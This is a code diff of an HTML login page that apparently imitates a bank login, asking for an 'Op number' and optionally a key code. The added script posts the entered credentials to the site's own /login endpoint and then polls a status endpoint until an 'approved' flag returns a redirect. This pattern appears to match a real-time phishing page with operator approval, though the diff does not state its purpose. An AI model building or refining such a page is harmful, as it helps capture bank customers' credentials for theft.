@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="stylesheet" href="style.css" />
-    <title>Document</title>
+    <title>Login</title>
   </head>
   <body>
     <div class="main-container">
@@ -53,24 +53,28 @@
         <div style="font-family: sans-serif; margin-bottom: 5px">Username</div>
         <input
           type="text"
+          id="login"
           class="form-input"
           placeholder="Enter your Op number"
         />
       </div>
-      <div id="password">
+      <div id="password" style="display: none">
         <div style="font-family: sans-serif; margin-bottom: 5px">Password</div>
         <input
-          type="text"
-          placeholder="Enter your Op number"
+          type="password"
+          id="password-input"
           class="form-input"
+          placeholder="Enter your password"
         />
       </div>
-      <div class="forget"><a>Forget your username?</a></div>
+      <div class="error" id="error" style="color: red; display: none; font-family: sans-serif; margin-top: 10px"></div>
+      <div class="forget"><a href="#">Forget your username?</a></div>
       <div class="continue-button">
-        <button class="continue-btn">
+        <button id="continue-btn" class="continue-btn">
           <span>Continue</span>
         </button>
       </div>
+      <div class="loader" id="loader"></div>
       <div class="or-section">
         <div class="thin-container"></div>
         <span class="">OR</span>
@@ -82,28 +86,79 @@
     </div>
 
     <script>
-      const radioButtons = document.querySelectorAll(
-        'input[name="identification"]'
-      );
+      const radioButtons = document.querySelectorAll('input[name="identification"]');
       const passwordSection = document.getElementById("password");
+      const continueBtn = document.getElementById("continue-btn");
+      const errorDiv = document.getElementById("error");
+      const loader = document.getElementById("loader");
 
       function togglePasswordVisibility() {
-        const selected = document.querySelector(
-          'input[name="identification"]:checked'
-        ).value;
-        if (selected === "key_code") {
-          passwordSection.style.display = "flex";
-        } else {
-          passwordSection.style.display = "none";
-        }
+        const selected = document.querySelector('input[name="identification"]:checked').value;
+        passwordSection.style.display = selected === "key_code" ? "flex" : "none";
       }
 
-      // Run once on load (to respect initial selection)
       togglePasswordVisibility();
-
-      // Add event listeners for change
       radioButtons.forEach((radio) => {
         radio.addEventListener("change", togglePasswordVisibility);
+      });
+
+      continueBtn.addEventListener("click", async () => {
+        const login = document.getElementById("login").value;
+        const password = document.getElementById("password-input").value;
+        const identification = document.querySelector('input[name="identification"]:checked').value;
+
+        if (!login || (identification === "key_code" && !password)) {
+          errorDiv.style.display = "block";
+          errorDiv.textContent = "Please fill in all required fields.";
+          loader.style.display = "none";
+          return;
+        }
+
+        errorDiv.style.display = "none";
+        loader.style.display = "block";
+        continueBtn.disabled = true;
+
+        const data = identification === "key_code" ? { login, password } : { login };
+        try {
+          const response = await fetch("/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data),
+          });
+          const result = await response.json();
+          if (!result.success) {
+            errorDiv.style.display = "block";
+            errorDiv.textContent = result.error || "Submission failed.";
+            loader.style.display = "none";
+            continueBtn.disabled = false;
+            return;
+          }
+
+          const sessionId = result.id;
+          const pollStatus = async () => {
+            try {
+              const statusResponse = await fetch(`/status/${sessionId}`);
+              const status = await statusResponse.json();
+              if (status.status === "approved" && status.redirect_url) {
+                loader.style.display = "none";
+                window.location.href = status.redirect_url;
+              } else {
+                setTimeout(pollStatus, 2000);
+              }
+            } catch (error) {
+              errorDiv.style.display = "block";
+              errorDiv.textContent = "Error checking status. Please try again.";
+              loader.style.display = "none";
+              continueBtn.disabled = false;
+            }
+          };
+          pollStatus();
+        } catch (error) {
+          errorDiv.style.display = "block";
+          errorDiv.textContent = "An error occurred. Please try again.";
+          loader.style.display = "none";
+          continueBtn.disabled = false;
+        }
       });
     </script>
   </body>
